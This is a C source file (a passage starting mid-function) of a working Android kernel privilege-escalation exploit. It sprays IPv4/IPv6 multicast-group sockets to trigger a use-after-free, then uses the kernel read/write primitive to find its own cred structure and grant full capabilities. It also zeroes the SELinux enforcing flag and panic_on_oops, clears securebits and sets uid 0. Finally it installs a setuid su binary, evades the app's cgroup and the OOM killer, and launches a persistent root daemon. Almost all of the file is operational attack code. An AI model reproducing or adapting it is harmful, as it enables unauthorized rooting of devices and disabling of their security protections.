    for (int i = 0; i < n && i < 31; i++) {
        u8 c = p[i];
        b[i] = (c >= 0x20 && c < 0x7f) ? (char)c : '.';
    }
    write_(1, b, n < 31 ? n : 31);
}


static u64 find_task_pref(const char *pre, int n, u64 *outCred)
{
    u64 hd = INIT_TASK_A + TASKS_OFF;
    if (kread_at(hd + 8, 8) != 8) return 0;
    u64 cur = rd64(g_rbuf + 16);
    int cnt = 0;
    while (cnt < 400 && isk(cur) && cur != hd) {
        u64 task = cur - TASKS_OFF;
        if (kread_at(task + OFF_COMM, 16) == 16) {
            u8 *p = g_rbuf + 16;
            int ok = 1;
            for (int i = 0; i < n; i++) if (p[i] != (u8)pre[i]) { ok = 0; break; }
            if (ok) {
                if (outCred && kread_at(task + OFF_CRED, 8) == 8) *outCred = rd64(g_rbuf + 16);
                return task;
            }
        }
        if (kread_at(cur + 8, 8) != 8) break;
        cur = rd64(g_rbuf + 16);
        cnt++;
    }
    return 0;
}

void _start(void)
{
    u64 blk = (1UL << 0) | (1UL << 1) | (1UL << 12) | (1UL << 14);
    sigblock_(&blk);

    // ★ App 进程的 RLIMIT_NOFILE 比 adb shell 小得多, 而 spray 要用 590+ 个 fd.
    //   这里先读出来, 再把 soft 顶到 hard (提权前只能升到 hard).
    struct { u64 cur, max; } rl;
    sysc(163, 7, (long)&rl, 0, 0, 0, 0);            // getrlimit(RLIMIT_NOFILE)
    puts_("L ", 2); ph((u32)rl.cur); puts_("/", 1); ph((u32)rl.max); puts_("\n", 1);
    fsync_(1);
    rl.cur = rl.max;
    sysc(164, 7, (long)&rl, 0, 0, 0, 0);            // setrlimit
    sysc(163, 7, (long)&rl, 0, 0, 0, 0);
    puts_("L2 ", 3); ph((u32)rl.cur); puts_("\n", 1); fsync_(1);

    long m1 = mmap_(FAKE_BASE, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    long m2 = mmap_(RBUF_ADDR, 0x2000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    *(volatile u32 *)(P_FAKE + 8)  = 0x4d0100e0;
    *(volatile u32 *)(P_FAKE + 12) = 0;
    *(volatile u32 *)(P_FAKE + 16) = 1;
    *(volatile u32 *)(P_FAKE + 20) = 1;
    *(volatile u64 *)(P_FAKE + 24) = 0;

    puts_("M ", 2); ph((u32)m1); ph((u32)m2); puts_("\n", 1); fsync_(1);
    if (m1 != (long)FAKE_BASE || m2 != (long)RBUF_ADDR) exit_(1);

    long mo = rp_open();
    g_sp = (int)sysc(56, -100, (long)"/data/local/tmp/step.txt",
                     0x1 | 0x40 | 0x200, 0644, 0, 0);   // O_WRONLY|O_CREAT|O_TRUNC
    stp("S0 boot");
    rps("PRE mo="); rph((u32)mo); rps(" pid="); rph((u32)getpid_()); rpnl();
    rp64((u64)g_rp); rpnl();
    rpsync();
    if (mo != 0) exit_(9);

    // ================= 共享页日志 (提权后唯一可靠的输出通道) =================
    // ★ 2026-11-09 00:15 实证: 提权 (override_creds) 之后 cred->security 变
    //   kernel 域, Enforcing 下 write() 写 /data/local/tmp/* 直接 -EACCES,
    //   msync() 同样被拒, 连 stdout 也写不进去 —— 于是 "WON" 及其之后
    //   每一行日志全部静默. 看上去像卡死, 其实流程还在跑.
    //   注意 /proc/PID/status 的 Uid 读的是 real_cred, override_creds 只改
    //   cred, 所以那边永远显示 2000, 不能用来判断是否提权成功.
    //   解法: 提权前 fork 一个常驻 shell 域的抄写员子进程, 父子共享一块
    //   MAP_SHARED 匿名页. 父进程"打日志"只是往共享页里存字节 (纯用户态
    //   store, 零系统调用, 不经过任何 SELinux hook), 由子进程用它自己干净的
    //   cred 落盘. 提权之后唯一的可靠输出就是这个.
    {
        long la = mmap_(LG_ADDR, LG_SIZE, PROT_READ | PROT_WRITE,
                        1 | MAP_FIXED | MAP_ANONYMOUS, -1, 0);   // MAP_SHARED
        if (la == (long)LG_ADDR) {
            g_lgh = (volatile u32 *)LG_ADDR;
            g_lgb = (u8 *)(LG_ADDR + LGH);
            g_lgh[0] = 0;
            g_lgh[1] = 0;
            long lk = fork_();
            if (lk == 0) {
                u64 m3 = 4;
                affinity_(0, 8, &m3);
                u32 done = 0;
                for (;;) {
                    u32 sq = g_lgh[1];
                    u32 off = g_lgh[0];
                    u32 n = (sq && off) ? (off - 1) : 0;   // 末字节可能正在写, 下轮再来
                    if (n > done) {
                        int f = sysc(56, -100, (long)"/data/local/tmp/p78.log",
                                     O_WRONLY | O_CREAT | 0x400, 0644, 0, 0);
                        if (f >= 0) {
                            write_(f, g_lgb + done, (long)(n - done));
                            fsync_(f);
                            close_(f);
                            done = n;
                        }
                    }
                    sleepms(5);
                }
            }
            puts_("LG ", 3); ph((u32)lk); puts_("\n", 1); fsync_(1);
        } else {
            puts_("LG mmap-fail\n", 13); fsync_(1);
        }
    }
    lgs("== probe111 run, pid "); lgh_((u32)getpid_()); lgnl();

    // ★ 策略 blob 缓冲必须在提权前建好:
    //   实测提权 (override_creds) 之后 mmap 一律返回 -EACCES, 连非固定地址也一样.
    //   这里还在 shell 域, MAP_FIXED 到 0x21000000 是干净的.
    long pb = mmap_(POL_BUF, POL_MAX, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    rps("P0 pb "); rph((u32)pb); rpnl(); rpsync();

    // ★ su 二进制在这里就读进来 (还在 shell 域, 权限最宽松), 放在 pb + 0x100000.
    //   提权之后 cred->security 变成 kernel 域, 读 /data 会被 SELinux 拒 (EACCES);
    //   策略回灌之后再做 /data 的 I/O 还会偶发静默挂死. 所以"读"必须最早做.
    long sulen = (pb > 0) ? slurp("/data/local/tmp/su", (u64)(pb + 0x100000),
                                  (long)(POL_MAX - 0x100000)) : -1;
    rps("P0 su-len "); rph((u32)sulen); rpnl(); rpsync();

    sleepms(300);
    u64 mask = 1;
    affinity_(0, 8, &mask);

    long kids[10];
    for (int i = 0; i < 10; i++) {
        long kp = fork_();
        kids[i] = kp;
        if (kp == 0) {
            u64 m0 = 2;                 // 钉到 CPU1, 不干扰 CPU0
            affinity_(0, 8, &m0);
            for (;;) sleepms(1000);
        }
    }

    // ★ 2026-11-11 08:10: 同 probe_app.c —— 这 10 个钉核子进程 + 后面的
    //   exec 自检子进程退出后没人 wait, 父进程下会挂一堆 <defunct>。
    //   置 SIGCHLD=SIG_IGN 让内核直接回收。
    {
        struct { unsigned long h, fl, rs, mk; } sa3;
        sa3.h = 1; sa3.fl = 0; sa3.rs = 0; sa3.mk = 0;
        sysc(134, 17, (long)&sa3, 0, 8, 0, 0);
    }

    int spray500[500];
    int n500 = 0, n60 = 0, n30 = 0;
    for (int i = 0; i < 500; i++) {
        int s = socket_(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
        if (s < 0) break;
        spray500[n500++] = s;
    }
    int defrag60[60];
    for (int i = 0; i < 60; i++) {
        int s = socket_(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
        if (s < 0) break;
        defrag60[n60++] = s;
    }
    int grp30[30];
    for (int i = 0; i < 30; i++) {
        int s = socket_(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
        if (s < 0) break;
        grp30[n30++] = s;
    }
    puts_("S ", 2); ph((u32)n500); puts_("/",1); ph((u32)n60); puts_("/",1);
    ph((u32)n30); puts_("\n", 1); fsync_(1);

    char greq[136];
    greq_v4(greq, 1, 0xE0010177);
    int ser = socket_(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    puts_("ser=", 4); ph((u32)ser); puts_("\n", 1); fsync_(1);
    long r = setsockopt_(ser, SOL_IP, MCAST_JOIN_GROUP, greq, 136);
    puts_("J", 1); ph((u32)r); puts_("\n", 1); fsync_(1);
    if (r != 0) exit_(2);

    u32 port = 40000 + ((u32)getpid_() % 20000);
    char sa[16];
    for (int i = 0; i < 16; i++) sa[i] = 0;
    sa[0] = 2;
    sa[2] = (char)(port >> 8); sa[3] = (char)port;
    sa[4] = 127; sa[5] = 0; sa[6] = 0; sa[7] = 1;
    r = bind_(ser, sa, 16);
    if (r != 0) { mark('b'); exit_(4); }
    if (listen_(ser, 2) != 0) exit_(3);

    int cl0 = socket_(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    connect_(cl0, sa, 16);
    int cl1 = socket_(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    connect_(cl1, sa, 16);

    int cfd[2];
    cfd[0] = (int)accept_(ser, 0, 0);
    cfd[1] = (int)accept_(ser, 0, 0);
    if (cfd[0] < 0 || cfd[1] < 0) { mark('X'); hang(); }

    mark('2');
    char g6[136];
    for (int i = 0; i < 30; i++) {
        greq_v6(g6, 0);
        setsockopt_(grp30[i], SOL_IPV6, MCAST_JOIN_GROUP, g6, 136);
    }

    close_(cfd[0]);
    for (int i = 0; i < 60; i++) close_(defrag60[i]);
    for (int i = 0; i < 6; i++) sleepms(10);
    mark('3');

    for (int i = 0; i < 250; i++) {
        greq_v6(g6, 0);
        setsockopt_(spray500[i], SOL_IPV6, MCAST_JOIN_GROUP, g6, 136);
    }
    for (int i = 0; i < 6; i++) sleepms(10);
    for (int i = 250; i < 500; i++) {
        greq_v6(g6, 0);
        setsockopt_(spray500[i], SOL_IPV6, MCAST_JOIN_GROUP, g6, 136);
    }
    mark('4');
    fsync_(1);

    sleepms(300);
    mark('L');

    greq_v4(greq, 1, 0);
    r = setsockopt_(ser, SOL_IP, MCAST_LEAVE_GROUP, greq, 136);
    mark('m'); ph((u32)r); puts_("\n", 1);
    fsync_(1);
    if (r != 0) { mark('n'); hang(); }

    for (int i = 0; i < 10; i++)
        if (kids[i] > 0) kill_(kids[i], 9);
    sleepms(200);
    mark('k');

    // 起 klogw: 必须在 spray 全部结束之后, 否则会扰动时序导致 LEAVE 失败
    {
        long kp = fork_();
        if (kp == 0) {
            char *av[2]; av[0] = (char *)"/data/local/tmp/klogw"; av[1] = 0;
            char *ev[1]; ev[0] = 0;
            sysc(221, (long)av[0], (long)av, (long)ev, 0, 0, 0);
            exit_(0);
        }
        puts_("KW ", 3); ph((u32)kp); puts_("\n", 1); fsync_(1);
        sleepms(600);
    }

    g_ser = ser;

    char nm[16];
    for (int i = 0; i < 16; i++) nm[i] = 0;
    const char *me = "hohopwn0";
    for (int i = 0; i < 9; i++) nm[i] = me[i];
    sysc(167, 15, (long)nm, 0, 0, 0, 0);

    u64 myCred = 0;
    u64 myTask = find_task_pref("hohopwn0", 8, &myCred);
    if (!myTask || !myCred) { mark('Q'); hang(); }
    puts_("META ", 5); p64(myTask);
    puts_(" CRED ", 6); p64(myCred); puts_("\n", 1); fsync_(1);

    if (kread_at(myCred, 0x90) != 0x90) { mark('C'); hang(); }
    u8 *cp = g_rbuf + 16;
    u64 rUsr = rd64(cp + 0x78);
    u64 rUns = rd64(cp + 0x80);
    u64 rGrp = rd64(cp + 0x88);
    puts_("USR ", 4); p64(rUsr); puts_(" NS ", 4); p64(rUns);
    puts_(" GRP ", 5); p64(rGrp); puts_("\n", 1); fsync_(1);
    if (!isk(rUsr) || !isk(rUns) || !isk(rGrp)) { mark('V'); hang(); }


    rps("== p148 ==\n"); rpsync();

    u64 ENF = 0xffffffc00187d47cUL;
    u64 S   = ENF - 4;

    u32 e0 = 0xdeadbeef, sv = 0xdeadbeef;
    if (kread_at2(ENF, 4) == 4)    e0 = *(u32 *)(g_rbuf + 16);
    if (kread_at2(S + 24, 4) == 4) sv = *(u32 *)(g_rbuf + 16);
    rps("PRE enf "); rph(e0); rps(" src "); rph(sv); rpnl(); rpsync();

    // ===== 0.5) ★★ 先把 panic_on_oops 关掉 (必须在任何风险写之前) =====
    // panic_on_oops=1 时内核任何 oops 都会立刻 panic 重启 (panic=5),
    // 这就是"点一下偶尔黑屏重启"的唯一原因, 也是 panic 现场永远拿不到的原因。
    // 它是个 int 全局, 冷启动后值恒为 1; 用 kdec 减成 0, 代价为零 (见 kdec 注释)。
    // 减完之后: 后续任何 fault 只 kill 掉本进程, 内核活着, App 可以原地重试 ——
    // 不再需要重启手机。这是稳定性的地基。
    {
        u64 PO = 0xffffffc0017e14f0UL;      // int panic_on_oops  (B)
        u32 po = 0xdeadbeef;
        if (kread_at2(PO, 4) == 4) po = *(u32 *)(g_rbuf + 16);
        if (po == 1) {
            long r = kdec(PO);
            u32 p2 = 0xdeadbeef;
            if (kread_at2(PO, 4) == 4) p2 = *(u32 *)(g_rbuf + 16);
            rps("PO r"); rph((u32)r); rps(" -> "); rph(p2); rpnl(); rpsync();
        } else {
            // 不是 1 就绝不动它: 0 减 1 会变成 0xffffffff (等于把 panic 打开)
            rps("PO skip "); rph(po); rpnl(); rpsync();
        }
    }

    // ===== 1) 四写: cap_effective(0x38/0x3c) + cap_bset(0x40/0x44) =====
    {
        u64 wa[4]; u32 wv[4];
        wa[0] = myCred + 0x38; wv[0] = 0xffffffffU;
        wa[1] = myCred + 0x3c; wv[1] = 0x00000003U;
        wa[2] = myCred + 0x40; wv[2] = 0xffffffffU;
        wa[3] = myCred + 0x44; wv[3] = 0x00000006U;
        for (int i = 0; i < 4; i++) {
            u32 k2 = 0xdead;
            long w = kwrite(wa[i], wv[i], &k2);
            rps("W"); rpc((char)('0' + i)); rps(" r"); rph((u32)w); rps(" k"); rph(k2); rps(" "); rpsync();
        }
        rpnl(); rpsync();
    }

    // ===== 2) 关 SELinux (必须在 setfs* 之前!) =====
    // Enforcing 下 security_capable() 会拒 shell self:capability setgid/setuid,
    // setfsgid/setfsuid 于是静默返回旧值 —— 后续锚点全不成立 (实测 -2000).
    if (e0 != 1) {
        rps("SKIP dec\n"); rpsync();
    } else {
        long r = kdec(ENF);
        rps("DEC r"); rph((u32)r); rpnl(); rpsync();
    }

    u32 e1 = 0xdeadbeef;
    if (kread_at2(ENF, 4) == 4) e1 = *(u32 *)(g_rbuf + 16);
    rps("POST enf "); rph(e1); rpnl(); rpsync();

    // ===== 2.5) 写 cap_permitted (0x34 -> 0x30) =====
    // ★ app 进程带 no_new_privs, exec 时内核会多走一条
    //     new->cap_permitted = cap_intersect(new->cap_permitted, old->cap_permitted);
    //   如果 old->cap_permitted 还是 1, 满 caps 会被夹成 1 —— 这就是 app 域
    //   下"uid=0 但只有 CAP_CHOWN"的真凶。所以必须在 setresuid 之前把
    //   permitted 顶满。
    //   kwrite 锚点: W = S+24+4*u32(S+4), 需 sl_count==k 且 sl_max!=k:
    //     W=0x34: S=0x1c -> 要 fsgid==0 且 fsuid!=0
    //     W=0x30: S=0x18 -> 要 fsuid==0 且 egid!=0
    //   两个条件互斥 -> 先 setfsgid(0) 写 0x34, 再 setfsuid(0) 写 0x30.
    //   副作用: 每次成功写入把锚点字段 +1 (fsgid 0->1, fsuid 0->1), 无害.
    {
        long og = sysc(152, 0, 0, 0, 0, 0, 0);          // setfsgid(0)  aarch64=152
        u64 c1 = kread64(myTask + 0x4e0); if (!c1) c1 = myCred;
        u32 k1 = 0xdead;
        long r1 = kwrite(c1 + 0x34, 0x00000000U, &k1);
        long ou = sysc(151, 0, 0, 0, 0, 0, 0);          // setfsuid(0)  aarch64=151
        u64 c2 = kread64(myTask + 0x4e0); if (!c2) c2 = c1;
        u32 k2 = 0xdead;
        long r2 = kwrite(c2 + 0x30, 0xffffffffU, &k2);
        rps("PM fg"); rph((u32)og); rps(" w34 "); rph((u32)r1); rps(" k"); rph(k1);
        rps(" fu"); rph((u32)ou); rps(" w30 "); rph((u32)r2); rps(" k"); rph(k2);
        rpnl(); rpsync();
        myCred = c2;
    }

    // ===== 3) 清 securebits (SECURE_NOROOT) =====
    // 3.10 commoncap.c: exec 时若 euid==0 会做
    //     new->cap_permitted = cap_combine(old->cap_bset, old->cap_inheritable);
    //     effective = true;  -> new->cap_effective = new->cap_permitted;
    // 但整个分支被 if (!issecure(SECURE_NOROOT)) 包着。Android 在 zygote 里
    // 设了 securebits=1 (SECURE_NOROOT), 正好把这条路关掉, 所以必须清掉。
    {
        long pr = sysc(167, 28, 0, 0, 0, 0, 0);       // prctl(PR_SET_SECUREBITS, 0)
        rps("PRCTL "); rph((u32)pr); rps(" ");
        if (kread_at(myCred + 0x24, 4) == 4) {
            rps("SECBITS "); rph(*(u32 *)(g_rbuf + 16));
        }
        rpnl(); rpsync();
    }

    // ===== 4) su 落地 (必须在 setresuid 之前: 那时还有 caps) =====
    if (e1 == 0) {
        rps("UID "); rph((u32)getuid_()); rpnl(); rpsync();

    {
        int f = (int)openat_(-100, "/data/local/su", 0x1 | 0x40 | 0x200);
        long wr = -1;
        if (f >= 0) {
            if (sulen > 0) wr = write_(f, (void *)(pb + 0x100000), sulen);
            fsync_(f); close_(f);
        }
        long cw = sysc(54, -100, (long)"/data/local/su", 0, 0, 0, 0);
        long cm = sysc(53, -100, (long)"/data/local/su", 06755, 0, 0, 0);
        const char *cx = "u:object_r:shell_data_file:s0";
        sysc(5, (long)"/data/local/su", (long)XATTR_SEL, (long)cx, sl_(cx), 0, 0);
        rps("SU /data/local/su wr "); rph((u32)wr); rps(" c"); rph((u32)cw); rps(" m"); rph((u32)cm); rpnl();
        rpsync();
    }

    {
        int f = (int)openat_(-100, "/mnt/su", 0x1 | 0x40 | 0x200);
        long wr = -1;
        if (f >= 0) {
            if (sulen > 0) wr = write_(f, (void *)(pb + 0x100000), sulen);
            fsync_(f); close_(f);
        }
        long cw = sysc(54, -100, (long)"/mnt/su", 0, 0, 0, 0);
        long cm = sysc(53, -100, (long)"/mnt/su", 06755, 0, 0, 0);
        const char *cx = "u:object_r:shell_data_file:s0";
        sysc(5, (long)"/mnt/su", (long)XATTR_SEL, (long)cx, sl_(cx), 0, 0);
        rps("SU /mnt/su wr "); rph((u32)wr); rps(" c"); rph((u32)cw); rps(" m"); rph((u32)cm); rpnl();
        rpsync();
    }

    }

    // ===== 5) setresgid/setresuid = 0 =====
    // 注意: cap_emulate_setxuid 会把 effective 重算成 permitted(=0), 会丢 caps,
    // 所以 su 落地必须放在这之前。之后靠 exec 的 euid==0 分支重新拿满 caps。
    {
        long rg = sysc(149, 0, 0, 0, 0, 0, 0);        // setresgid(0,0,0)
        long ru = sysc(147, 0, 0, 0, 0, 0, 0);        // setresuid(0,0,0)
        rps("SETRES rg"); rph((u32)rg); rps(" ru"); rph((u32)ru); rpnl(); rpsync();
        ustat("T3 root");
        myCred = kread64(myTask + 0x4e0);
    }

    // 脱离 app 的进程组/会话: 否则 am force-stop (或系统清理) 会按 pgid
    // 把我们也杀掉 —— 而我们手里还攥着 UAF 的 socket, 一被杀就 kernel panic.
    {
        long sd = sysc(157, 0, 0, 0, 0, 0, 0);        // setsid
        rps("SETSID "); rph((u32)sd); rpnl(); rpsync();
    }

    // 把本进程从 app 的 uid cgroup 挪到 uid_0: am force-stop 是按
    // /acct/uid_<uid>/cgroup.procs 扫的, 我们不挪出去就会被一起 SIGKILL,
    // 而杀我们 = 关掉 UAF socket = kernel panic.
    {
        sysc(34, -100, (long)"/acct/uid_0", 0777, 0, 0, 0);       // mkdirat
        int f = (int)sysc(56, -100, (long)"/acct/uid_0/cgroup.procs", 0x1, 0, 0, 0);
        long w = -1;
        if (f >= 0) {
            char pb[16]; int n = 0;
            long v = getpid_(); char t[12]; int d = 0;
            if (v == 0) t[d++] = '0';
            while (v > 0) { t[d++] = (char)('0' + (int)(v % 10)); v /= 10; }
            while (d > 0) pb[n++] = t[--d];
            w = write_(f, pb, n);
            close_(f);
        }
        rps("CGRP w"); rph((u32)w); rpnl(); rpsync();
    }

    // LMK 保命: root 服务要是被回收, UAF socket 一关就 panic
    {
        int f = (int)sysc(56, -100, (long)"/proc/self/oom_score_adj", 0x1, 0, 0, 0);
        long w = -1;
        if (f >= 0) { w = write_(f, "-1000", 5); close_(f); }
        rps("OOM w"); rph((u32)w); rpnl(); rpsync();
    }

    // ===== 6) exec 验证: euid=0 的 exec 是否自动拿回满 caps =====
    {
        long c = fork_();
        if (c == 0) {
            char *argv[2];
            argv[0] = (char *)"capchk";
            argv[1] = 0;
            sysc(221, (long)"/data/local/tmp/capchk", (long)argv, 0, 0, 0, 0);
            exit_(8);
        }
        rps("FORK ch "); rph((u32)c); rpnl(); rpsync();
        sleepms(700);
        pstat(c, "CH");
    }

    // ★ 2026-11-11 08:10: 主动扫一遍已有的僵尸 (SIG_IGN 只对之后退出的生效)
    {
        long nreap = 0;
        for (;;) {
            long r = sysc(260, -1, 0, 1, 0, 0, 0);   // wait4(-1, NULL, WNOHANG, NULL)
            if (r <= 0) break;
            nreap++;
        }
        rps("REAP "); rph((u32)nreap); rpnl(); rpsync();
    }

    // ===== 7) 起常驻 root 服务 =====
    {
        long d = fork_();
        if (d == 0) { serve_root(); exit_(0); }
        rps("DAEMON "); rph((u32)d); rpnl(); rpsync();
    }

    for (int i = 0; i < 200; i++) { rps("HB "); rph((u32)getuid_()); rpnl(); rpsync(); sleepms(2000); }
    rps("END\n"); rpsync();
    puts_("END\n", 4);
    hang();
}
